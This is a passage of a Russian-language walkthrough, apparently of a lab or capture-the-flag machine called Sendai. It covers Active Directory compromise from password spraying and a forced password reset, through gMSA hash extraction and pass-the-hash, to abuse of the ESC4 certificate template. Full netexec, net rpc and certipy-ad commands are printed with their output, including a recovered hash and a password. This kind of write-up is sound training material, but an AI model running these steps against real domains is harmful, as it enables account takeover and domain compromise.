+<span class="go">SMB         10.129.59.196   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1129: SENDAI\admsvc (SidTypeGroup)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)</span>
+<span class="go">SMB         10.129.59.196   445    DC               1131: SENDAI\support (SidTypeGroup)</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.59.196<span class="w"> </span>-u<span class="w"> </span><span class="s1">'guest'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--generate-hosts-file<span class="w"> </span>sendai_hosts
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Из результата выполненных выше команд фиксируем наличие доступа к трём шарам на уровне чтения. Кроме того, у нас получилось перечислить существующих в домене юзеров, которые, возможно, нам понадобятся в будущем, поэтому я создал и отформатировал список пользователей.</p>
+<details class="note">
+<summary>Список юзеров и конфигурация для /etc/hosts</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="4:2"><input checked="checked" id="__tabbed_4_1" name="__tabbed_4" type="radio"><input id="__tabbed_4_2" name="__tabbed_4" type="radio"><div class="tabbed-labels"><label for="__tabbed_4_1">Список пользователей</label><label for="__tabbed_4_2">/etc/hosts</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<figure id="__screenshot_1">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_userlist.webp" data-desc-position="bottom"><img alt="Список пользователей" src="../images/sendai/sendai_userlist.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 1:</span> Список пользователей sendai.vl</p>
+</figcaption>
+</figure>
+</div>
+<div class="tabbed-block">
+<figure id="__screenshot_2">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_hosts.webp" data-desc-position="bottom"><img alt="/etc/hosts" src="../images/sendai/sendai_hosts.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 2:</span> Конфигурация для /etc/hosts</p>
+</figcaption>
+</figure>
+</div>
+</div>
+</div>
+</details>
+<div class="admonition tip">
+<p class="admonition-title">Формирование списка пользователей</p>
+<p>Для того, чтобы получить готовый список пользователей, вывод <code>NetExec</code> можно отформатировать, предварительно сохранив полученных пользователей в файл с произвольным именем. Далее содержимое этого файла можно отформатировать следующим образом:</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s1">'SidTypeUser'</span><span class="w"> </span>users.lst<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="s1">'\'</span><span class="w"> </span><span class="s1">'{print $2}'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="w"> </span>&gt;<span class="w"> </span>clean_users.lst
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<p>Теперь, когда мы выполнили первостепенные действия, можно углубиться в содержимое найденных нами шар. Для этого можно воспользоваться тулом <code>smbmap</code>, поскольку он умеет рекурсивно обходить все шары и вложенные в них каталоги, файлы, что позволяет достаточно быстро перечислить содержимое шар на предмет полезных данных. Кроме того, этот тул умеет также рекурсивно скачивать все найденные файлы или только указанные.</p>
+<details class="note">
+<summary>Пример работы smbmap</summary>
+<figure id="__screenshot_3">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_smbmap.webp" data-desc-position="bottom"><img alt="Пример работы smbmap" src="../images/sendai/sendai_smbmap.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 3:</span> Пример работы smbmap</p>
+</figcaption>
+</figure>
+</details>
+<div class="admonition info">
+<p class="admonition-title">Примечание по поводу <code>netexec</code></p>
+<p><code>netexec</code> точно также, как и <code>smbmap</code>, умеет рекурсивно перечислять содержимое SMB шар. Однако, при попытке выполнить подобное перечисление при помощи его встроенной функции <code>--spider</code> я потерпел неудачу: тул без всяких ошибок завершал перечисление, будто говоря о том, что перечислять попросту нечего. Я пытался найти какую-либо информацию о подобном поведении <code>netexec</code>, но не нашёл внятных объяснений. Если кто в курсе, буду рад вашим комментариям по данному поводу.</p>
+</div>
+<p>Перечисление шар не дало особо весомых плодов. Среди содержимого мое внимание привлёк один файл <code>incident.txt</code>. Там говорилось о том, что недавно была проведена инвентаризация паролей учетных записей: слабые пароли у обнаруженных юзеров были сброшены, а это значит, что при следующей аутентификации им нужно будет сменить свой пароль. Поначалу было не совсем понятно, что этим пытается сказать автор, потому как более чего-то полезного, кроме этого файла, я найти не смог. На текущий момент у меня есть только список пользователей домена.</p>
+<details class="note">
+<summary>Содержимое incident.txt</summary>
+<figure id="__screenshot_4">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_incident.webp" data-desc-position="bottom"><img alt="Содержимое incident.txt" src="../images/sendai/sendai_incident.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 4:</span> Содержимое incident.txt</p>
+</figcaption>
+</figure>
+</details>
+<h2 id="t1078002-t1069002-t1098-t1021006">Получение начального доступа, перечисление домена и первый флаг — <code>T1078.002</code>, <code>T1069.002</code>, <code>T1098</code>, <code>T1021.006</code><a class="headerlink" href="#t1078002-t1069002-t1098-t1021006" title="Permanent link">¶</a></h2>
+<p>Поразмышляв немного над тем, что у меня есть на руках, я принялся искать информацию о том, что бывает, если юзеру сбрасывают пароль и просят установить его при следующей аутентифкиации. Спустя некоторое время я наткнулся на <a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/password-spraying.html" target="_blank">статью</a>, в которой описана ситуация, когда при выполнении <code>password spraying</code> у определенных юзеров присутствует флаг <code>STATUS_PASSWORD_MUST_CHANGE</code>. Для меня (как для атакующего) это говорит о том, что я могу установить этому юзеру новый пароль, не зная его старого пароля, и, соответственно, пройти аутентификацию от его имени. Надеясь на позитивный исход, я принялся с помощью <code>netexec</code> "распылять" пустой пароль по пользователям в моём списке, который я ранее составил, воспользовавшись функцией <code>--rid-brute</code>.</p>
+<details class="note">
+<summary>Результат распыления пароля</summary>
+<figure id="__screenshot_5">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_spraying.webp" data-desc-position="bottom"><img alt="Результат распыления пароля" src="../images/sendai/sendai_spraying.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 5:</span> Результат распыления пароля</p>
+</figcaption>
+</figure>
+</details>
+<p>На скриншоте выше видно, что у пользователей домена <code>elliot.yates</code> и <code>thomas.powell</code> активен флаг <code>STATUS_PASSWORD_MUST_CHANGE</code>. Это значит, что любому из этих пользователей мы можем самостоятельно установить любой пароль. Использовать мы для этого будем, опять же, <code>netexec</code>. Я выбрал для этого пользователя <code>elliot.yates</code>. Поскольку на данном этапе у нас нет какой-либо информации об их отличительных особенностях, выбор между ними непринципиален. После установки нового пароля сразу же проверим возможность аутентификации от имени этого юзера.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="5:2"><input checked="checked" id="__tabbed_5_1" name="__tabbed_5" type="radio"><input id="__tabbed_5_2" name="__tabbed_5" type="radio"><div class="tabbed-labels"><label for="__tabbed_5_1">Изменение пароля</label><label for="__tabbed_5_2">Попытка аутентификации</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span>dc.sendai.vl<span class="w"> </span>-u<span class="w"> </span><span class="s1">'elliot.yates'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-M<span class="w"> </span>change-password<span class="w"> </span><span class="nv">NEWPASS</span><span class="o">=</span><span class="s1">'Password123'</span>
+<span class="go">SMB         10.129.59.196    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) </span>
+<span class="gp gp-VirtualEnv">(signing:True)</span> <span class="go">(SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.59.196    445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE </span>
+<span class="go">CHANGE-P... 10.129.59.196    445    DC               [+] Successfully changed password for elliot.yates</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span>dc.sendai.vl<span class="w"> </span>-u<span class="w"> </span><span class="s1">'elliot.yates'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Password123'</span>
+<span class="go">SMB         10.129.59.196    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) </span>
+<span class="gp gp-VirtualEnv">(domain:sendai.vl)</span> <span class="go">(signing:True) (SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.59.196    445    DC               [+] sendai.vl\elliot.yates:Password123 </span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Из результата работы <code>netexec</code> видим, что установка нового пароля успешно завершена и юзер <code>elliot.yates</code> доступен для аутентификации с новым установленным паролем (<code>Password123</code>). Теперь, когда у нас есть учетные данные одного из юзеров домена, мы можем выполнить полное перечисление домена с помощью <code>rusthound-ce</code>. Я открыл этот сборщик для себя совсем недавно. Как следует из названия, написан он на <code>Rust</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="6:1"><input checked="checked" id="__tabbed_6_1" name="__tabbed_6" type="radio"><div class="tabbed-labels"><label for="__tabbed_6_1">rusthound-ce</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>rusthound-ce<span class="w"> </span>-d<span class="w"> </span>sendai.vl<span class="w"> </span>-u<span class="w"> </span><span class="s1">'elliot.yates'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Password123'</span><span class="w"> </span>-f<span class="w"> </span>DC.sendai.vl<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>-z
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Приведенная выше команда завершается успехом и мы получаем zip-архив со всеми данными о домене <code>sendai.vl</code>. Для анализа полученных данных поднимаем <code>bloodhound</code> и здесь перед нами выстраивается вполне перспективная цепочка. Наш пользователь, <code>elliot.yates</code>, находится в группе <code>Support</code>, представители которой имеют разрешение <code>GenericAll</code> в отношении группы <code>ADMSVC</code> (скриншот 6), а группа <code>ADMSVC</code>, в свою очередь, имеет разрешение <code>ReadGMSAPassword</code> в отношении компьютерной учетной записи <code>MGTSVC$</code> (скриншот 7).</p>
+<details class="note">
+<summary>Выявленные разрешения между субъектами домена</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="7:2"><input checked="checked" id="__tabbed_7_1" name="__tabbed_7" type="radio"><input id="__tabbed_7_2" name="__tabbed_7" type="radio"><div class="tabbed-labels"><label for="__tabbed_7_1">Support --&gt; (GenericAll) --&gt; ADMSVC</label><label for="__tabbed_7_2">ADMSVC --&gt; (ReadGMSAPassword) --&gt; MGTSVC$</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<figure id="__screenshot_6">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_elliot_to_admsvc.webp" data-desc-position="bottom"><img alt="Support --&gt; (GenericAll) --&gt; ADMSVC" src="../images/sendai/sendai_elliot_to_admsvc.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 6:</span> Support --&gt; (GenericAll) --&gt; ADMSVC"</p>
+</figcaption>
+</figure>
+</div>
+<div class="tabbed-block">
+<figure id="__screenshot_7">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/admsvc_to_mgtsvc.webp" data-desc-position="bottom"><img alt="ADMSVC --&gt; (ReadGMSAPassword) --&gt; MGTSVC$" src="../images/sendai/admsvc_to_mgtsvc.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 7:</span> ADMSVC --&gt; (ReadGMSAPassword) --&gt; MGTSVC$</p>
+</figcaption>
+</figure>
+</div>
+</div>
+</div>
+</details>
+<p>Выявленные нами обстоятельства позволяют сделать следующее: добавить юзера <code>elliot.yates</code> в группу <code>ADMSVC</code>, пользуясь наличием разрешения <code>GenericAll</code>; используя разрешение <code>ReadGMSAPassword</code> у группы <code>ADMSVC</code> в отношении <code>MGTSVC$</code> запросить хэш пароля данной компьютерной учтеной записи; завершащающим итогом станет аутентификаиця от лица <code>MGTSVC$</code>. Для добавления нашего пользователя <code>elliot.yates</code> в группу <code>ADMSVC</code> можно использовать тул <code>net</code> или <code>bloodyad</code>. С помощью <code>net</code> затем проверим, что пользователь <code>elliot.yates</code> действительно был добавлен в группу <code>ADMSVC</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="8:2"><input checked="checked" id="__tabbed_8_1" name="__tabbed_8" type="radio"><input id="__tabbed_8_2" name="__tabbed_8" type="radio"><div class="tabbed-labels"><label for="__tabbed_8_1">net addmem</label><label for="__tabbed_8_2">net members</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>addmem<span class="w"> </span><span class="s2">"ADMSVC"</span><span class="w"> </span><span class="s2">"elliot.yates"</span><span class="w"> </span>-U<span class="w"> </span>sendai.vl/elliot.yates%Password123<span class="w"> </span>-U<span class="w"> </span>dc.sendai.vl
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>members<span class="w"> </span><span class="s2">"ADMSVC"</span><span class="w"> </span>-U<span class="w"> </span>sendai.vl/elliot.yates%Password123<span class="w"> </span>-U<span class="w"> </span>dc.sendai.vl
+<span class="go">SENDAI\websvc</span>
+<span class="go">SENDAI\Norman.Baxter</span>
+<span class="go">SENDAI\Elliot.Yates</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Из результата работы <code>net</code> видим, что в группе <code>ADMSVC</code> на данный момент состоит три юзера, в том числе добавленный нами <code>elliot.yates</code>. Теперь, используя нашего пользователя, мы можем воспользоваться разрешением <code>ReadGMSAPassword</code> в отношении компьютерной учетной записи <code>MGTSVC$</code>. Существуют разные способы получения хэша пароля учетной записи при помощи наличия данного разрешения, но я вновь прибегну к использованию <code>netexec</code>, потому как, по моему мнению, в данных условиях это самый простой и быстрый способ получить заветный хэш.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="9:1"><input checked="checked" id="__tabbed_9_1" name="__tabbed_9" type="radio"><div class="tabbed-labels"><label for="__tabbed_9_1">netexec --gmsa</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>ldap<span class="w"> </span>dc.sendai.vl<span class="w"> </span>-u<span class="w"> </span><span class="s1">'elliot.yates'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Password123'</span><span class="w"> </span>--gmsa
+<span class="go">LDAP        10.129.59.196    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) </span>
+<span class="gp gp-VirtualEnv">(domain:sendai.vl)</span> <span class="go">(signing:None) (channel binding:Never) </span>
+<span class="go">LDAP        10.129.59.196    389    DC               [+] sendai.vl\elliot.yates:Password123 </span>
+<span class="go">LDAP        10.129.59.196    389    DC               [*] Getting GMSA Passwords</span>
+<span class="go">LDAP        10.129.59.196    389    DC               Account: mgtsvc$              NTLM: 07d0303e41518a6ffcc323f5b3744cb3     PrincipalsAllowedToReadPassword: admsvc</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Теперь, когда у нас в наличии есть хэш пароля учетной записи <code>mgtsvc$</code>, мы можем выполнить атаку вида <code>Pass-the-Hash</code> для того, чтобы получить интерактивную сессию от имени данной учетной записи. Для этого мы воспользуемся <code>evil-winrm</code> со встроенной опцией <code>-H</code> для того, чтобы предоставить хэш вместо пароля в открытом виде. После аутентификации заберем первый флаг <code>user.txt</code>.</p>
+<details class="note">
+<summary>Flag 1 (user.txt)</summary>
+<figure id="__screenshot_8">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_user_flag.webp" data-desc-position="bottom"><img alt="Flag 1 (user.txt)" src="../images/sendai/sendai_user_flag.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 8:</span> Flag 1 (user.txt)</p>
+</figcaption>
+</figure>
+</details>
+<h2 id="t1007-t1552002">Локальное перечисление сервисов и извлечение учетных данных — <code>T1007</code>, <code>T1552.002</code><a class="headerlink" href="#t1007-t1552002" title="Permanent link">¶</a></h2>
+<p>После того, как я смог получить интерактивную сессию от имени <code>MGTSVC$</code>, я принялся выполнять локальное перечисление системы. Из всех предпринятых методов перечисления плоды дал только один: перечисление запущенных служб.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="10:1"><input checked="checked" id="__tabbed_10_1" name="__tabbed_10" type="radio"><div class="tabbed-labels"><label for="__tabbed_10_1">Перечисление служб</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="go">dir -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | select-string -NotMatch "svchost.exe" | select-string "exe"</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>В результате данного перечисления при запуске одной из служб были переданы учетные данные в открытом виде пользователя домена <code>clifford.davey</code>. Проверка с помощью <code>netexec</code> подтвердила подлинность учетных данных.</p>
+<details class="note">
+<summary>Обнаруженные учетные данные</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="11:2"><input checked="checked" id="__tabbed_11_1" name="__tabbed_11" type="radio"><input id="__tabbed_11_2" name="__tabbed_11" type="radio"><div class="tabbed-labels"><label for="__tabbed_11_1">Учетные данные</label><label for="__tabbed_11_2">Проверка учетных данных</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<figure id="__screenshot_9">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_credentials.webp" data-desc-position="bottom"><img alt="Обнаруженные учетные данные" src="../images/sendai/sendai_credentials.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 9:</span> Обнаруженные учетные данные</p>
+</figcaption>
+</figure>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span>dc.sendai.vl<span class="w"> </span>-u<span class="w"> </span><span class="s1">'clifford.davey'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'RFmoB2WplgE_3p'</span>
+<span class="go">SMB         10.129.59.196    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) </span>
+<span class="gp gp-VirtualEnv">(domain:sendai.vl)</span> <span class="go">(signing:True) (SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.59.196    445    DC               [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+</details>
+<h2 id="ad-cs-t1649-t1550002">Эксплуатация AD CS, компрометация домена и второй флаг — <code>T1649</code>, <code>T1550.002</code><a class="headerlink" href="#ad-cs-t1649-t1550002" title="Permanent link">¶</a></h2>
+<p>После получения очередной скомпрометированной учетной записи сразу же идём проверять её возможности в <code>BloodHound</code>. После анализа полученной учетной записи я зафиксировал важную вещь: юзер <code>clifford.davey</code> состоит в группе <code>CA-OPERATORS</code>, члены которой, в свою очередь, имеют разрешение <code>GenericAll</code> в отношении шаблона сертификата <code>SENDAICOMPUTER</code>, что видно на скриншоте 10.</p>
+<details class="note">
+<summary><code>clifford.davey</code> в <code>BloodHound</code></summary>
+<figure id="__screenshot_10">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/sendai/sendai_clifford_group.webp" data-desc-position="bottom"><img alt="clifford.davey в BloodHound" src="../images/sendai/sendai_clifford_group.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 10:</span><code>clifford.davey</code> в <code>BloodHound</code></p>
+</figcaption>
+</figure>
+</details>
+<p>Факт наличия таких прав у скомпрометированного нами пользователя говорит о возможности проведения атаки <code>ESC4</code>. То есть, мы можем модифицировать сертификат и выпустить его для заданного пользователя, например, администратора, а затем аутентфицироваться с его помощью в системе (<code>Pass-the-Cerificate</code>). Проводя модификацию (изменение) шаблона сертификата, мы делаем его уязвимым для проведения других видов атак, в нашем случае для проведения атаки <code>ESC1</code>. Это значит, что мы можем использовать уязвимый сертификат для прохождения аутентификации от имени любого пользователя домена. Для эксплуатации уязвимого шаблона сертификата я буду использовать тул <code>certipy-ad</code>.</p>
+<details class="note">
+<summary>Эксплуатация уязвимого шаблона сертификата</summary>
+<div class="tabbed-set tabbed-alternate" data-tabs="12:3"><input checked="checked" id="__tabbed_12_1" name="__tabbed_12" type="radio"><input id="__tabbed_12_2" name="__tabbed_12" type="radio"><input id="__tabbed_12_3" name="__tabbed_12" type="radio"><div class="tabbed-labels"><label for="__tabbed_12_1">Модификация шаблона</label><label for="__tabbed_12_2">Запрос сертификата для Administrator</label><label for="__tabbed_12_3">Аутентификация от имени Administrator</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>certipy-ad<span class="w"> </span>template<span class="w"> </span>-u<span class="w"> </span><span class="s1">'clifford.davey'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'RFmoB2WplgE_3p'</span><span class="w"> </span>-template<span class="w"> </span>SENDAICOMPUTER<span class="w"> </span>-target<span class="w"> </span><span class="m">10</span>.129.59.196<span class="w"> </span>-write-default-configuration
+<span class="go">Certipy v5.0.4 - by Oliver Lyak (ly4k)</span>
+
+<span class="go">[*] Saving current configuration to 'SendaiComputer.json'</span>
+<span class="go">[*] Wrote current configuration for 'SENDAICOMPUTER' to 'SendaiComputer.json'</span>
+<span class="go">[*] Updating certificate template 'SendaiComputer'</span>
+<span class="go">[*] Replacing:</span>
+<span class="go">[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'</span>
+<span class="go">[*]     flags: 66104</span>
+<span class="go">[*]     pKIDefaultKeySpec: 2</span>
+<span class="go">[*]     pKIKeyUsage: b'\x86\x00'</span>
+<span class="go">[*]     pKIMaxIssuingDepth: -1</span>
+<span class="go">[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']</span>
+<span class="go">[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'</span>
+<span class="go">[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']</span>
+<span class="go">[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']</span>
+<span class="go">[*]     msPKI-Enrollment-Flag: 0</span>
+<span class="go">[*]     msPKI-Private-Key-Flag: 16</span>
+<span class="go">[*]     msPKI-Certificate-Name-Flag: 1</span>
+<span class="go">[*]     msPKI-Minimal-Key-Size: 2048</span>
+<span class="go">[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']</span>
+<span class="go">Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y</span>
+<span class="go">[*] Successfully updated 'SendaiComputer'</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
